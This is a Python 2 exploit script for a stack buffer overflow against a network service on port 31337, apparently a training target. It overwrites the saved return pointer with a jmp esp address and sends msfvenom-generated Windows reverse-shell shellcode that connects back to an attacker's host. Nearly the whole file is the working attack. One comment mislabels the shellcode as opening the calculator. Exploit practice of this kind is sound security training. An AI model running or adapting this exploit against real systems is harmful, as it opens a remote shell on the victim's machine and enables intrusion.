#!/usr/bin/env python2
import socket
import struct
# configure the IP and port we're connecting to
RHOST = "<target-ip-here>"
RPORT = 31337

# create a TCP connection (socket)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# Specify buffer length and the saved return pointer offset
buf_totlen = 1024
offset_srp = 146


ptr_jmp_esp = 0x080414C3 # memory address of jmp esp
sub_esp_10 = "\x83\xec\x10" # assembly code to subtract esp by 16 bytes to move it "up" the stack

# reverse shell creation: msfvenom -p windows/shell_reverse_tcp -b '\x00\x0A' -f python --var-name rev_shell LHOST=<target-ip-here> LPORT=<target-port-here> EXITFUNC=thread
rev_shell =  ""
rev_shell += "\xbd\xa8\x89\x8e\x35\xd9\xc6\xd9\x74\x24\xf4"
rev_shell += "\x5a\x29\xc9\xb1\x52\x31\x6a\x12\x83\xea\xfc"
rev_shell += "\x03\xc2\x87\x6c\xc0\xee\x70\xf2\x2b\x0e\x81"
rev_shell += "\x93\xa2\xeb\xb0\x93\xd1\x78\xe2\x23\x91\x2c"
rev_shell += "\x0f\xcf\xf7\xc4\x84\xbd\xdf\xeb\x2d\x0b\x06"
rev_shell += "\xc2\xae\x20\x7a\x45\x2d\x3b\xaf\xa5\x0c\xf4"
rev_shell += "\xa2\xa4\x49\xe9\x4f\xf4\x02\x65\xfd\xe8\x27"
rev_shell += "\x33\x3e\x83\x74\xd5\x46\x70\xcc\xd4\x67\x27"
rev_shell += "\x46\x8f\xa7\xc6\x8b\xbb\xe1\xd0\xc8\x86\xb8"
rev_shell += "\x6b\x3a\x7c\x3b\xbd\x72\x7d\x90\x80\xba\x8c"
rev_shell += "\xe8\xc5\x7d\x6f\x9f\x3f\x7e\x12\x98\x84\xfc"
rev_shell += "\xc8\x2d\x1e\xa6\x9b\x96\xfa\x56\x4f\x40\x89"
rev_shell += "\x55\x24\x06\xd5\x79\xbb\xcb\x6e\x85\x30\xea"
rev_shell += "\xa0\x0f\x02\xc9\x64\x4b\xd0\x70\x3d\x31\xb7"
rev_shell += "\x8d\x5d\x9a\x68\x28\x16\x37\x7c\x41\x75\x50"
rev_shell += "\xb1\x68\x85\xa0\xdd\xfb\xf6\x92\x42\x50\x90"
rev_shell += "\x9e\x0b\x7e\x67\xe0\x21\xc6\xf7\x1f\xca\x37"
rev_shell += "\xde\xdb\x9e\x67\x48\xcd\x9e\xe3\x88\xf2\x4a"
rev_shell += "\xa3\xd8\x5c\x25\x04\x88\x1c\x95\xec\xc2\x92"
rev_shell += "\xca\x0d\xed\x78\x63\xa7\x14\xeb\x4c\x90\x66"
rev_shell += "\x6b\x24\xe3\x86\x6a\x0e\x6a\x60\x06\x60\x3b"
rev_shell += "\x3b\xbf\x19\x66\xb7\x5e\xe5\xbc\xb2\x61\x6d"
rev_shell += "\x33\x43\x2f\x86\x3e\x57\xd8\x66\x75\x05\x4f"
rev_shell += "\x78\xa3\x21\x13\xeb\x28\xb1\x5a\x10\xe7\xe6"
rev_shell += "\x0b\xe6\xfe\x62\xa6\x51\xa9\x90\x3b\x07\x92"
rev_shell += "\x10\xe0\xf4\x1d\x99\x65\x40\x3a\x89\xb3\x49"
rev_shell += "\x06\xfd\x6b\x1c\xd0\xab\xcd\xf6\x92\x05\x84"
rev_shell += "\xa5\x7c\xc1\x51\x86\xbe\x97\x5d\xc3\x48\x77"
rev_shell += "\xef\xba\x0c\x88\xc0\x2a\x99\xf1\x3c\xcb\x66"
rev_shell += "\x28\x85\xeb\x84\xf8\xf0\x83\x10\x69\xb9\xc9"
rev_shell += "\xa2\x44\xfe\xf7\x20\x6c\x7f\x0c\x38\x05\x7a"
rev_shell += "\x48\xfe\xf6\xf6\xc1\x6b\xf8\xa5\xe2\xb9"

# buffer creation
buf = ""
buf += "A" * (offset_srp - len(buf))    # padding
buf += struct.pack("<I", ptr_jmp_esp)   # overwriting the saved return pointer with the memory address of the jmp esp instruction
buf += sub_esp_10                       # ESP points to here, and will be subtracted by 16 bytes
buf += rev_shell                   # shellcode to open up the calculator app on Windows
buf += "D" * (buf_totlen - len(buf))    # trailing padding
buf += "\n"

# send a message down the socket
s.send(buf)

# print out what we sent
print("[+] Delivered payload: {0}".format(buf))
